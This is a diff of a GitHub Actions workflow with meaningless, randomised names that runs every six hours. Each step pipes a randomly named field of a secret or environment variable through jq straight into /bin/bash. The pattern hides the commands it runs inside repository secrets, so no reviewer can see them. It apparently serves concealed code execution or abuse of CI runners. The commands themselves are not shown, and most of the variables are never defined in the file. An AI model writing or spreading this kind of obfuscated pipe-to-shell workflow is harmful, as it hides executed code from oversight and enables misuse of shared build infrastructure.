@@ -1,8 +1,9 @@
 name: chengliangqiang5432
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
+    - cron: '28 2/6 * * *'
 
 jobs:
   build:
@@ -11,17 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengliangqiang5432
         env:
-          svde35804: ${{ secrets.svde35804 }}
+          z1517: ${{ secrets.z1517 }}
         run: |
-          echo $svde35804 | jq -r .t905 | /bin/bash
-          echo $k97 | jq -r .xvx4936 | /bin/bash
-          echo $c11759 | jq -r .yal56 | /bin/bash
-          echo $dk25045 | jq -r .t11 | /bin/bash
-          echo $dhfa583 | jq -r .on72498 | /bin/bash
-          echo $v3 | jq -r .woj23358 | /bin/bash
-          echo $skg810 | jq -r .vvjl856 | /bin/bash
-          echo $syidb5439 | jq -r .ohsa772 | /bin/bash
-          echo $zn6 | jq -r .xvcb2 | /bin/bash
-          echo $novsk1961 | jq -r .lc722 | /bin/bash
-          echo $qgjg66494 | jq -r .ehds4433 | /bin/bash
+          echo $z1517 | jq -r .sozct4947 | /bin/bash
+          echo $evvya2467 | jq -r .ggr7 | /bin/bash
+          echo $i04 | jq -r .fscx390 | /bin/bash
+          echo $ags34 | jq -r .yoce9 | /bin/bash
+          echo $lil5165 | jq -r .mrwz8 | /bin/bash
+          echo $pdda4 | jq -r .mdeke381 | /bin/bash
+          echo $txxm45 | jq -r .cufxe6 | /bin/bash
+          echo $q7598 | jq -r .nj702 | /bin/bash
+          echo $w95056 | jq -r .ylr8 | /bin/bash
+          echo $bud1899 | jq -r .ah391 | /bin/bash
+          echo $jp9 | jq -r .svdvb07 | /bin/bash
+          echo $xdsrd4 | jq -r .sckyp4 | /bin/bash
+          echo $lgm223 | jq -r .dtgr81177 | /bin/bash
+          echo $ib99937 | jq -r .x7 | /bin/bash
+          echo $d444 | jq -r .tit3 | /bin/bash
+          echo $gy366 | jq -r .pvdb13 | /bin/bash
 
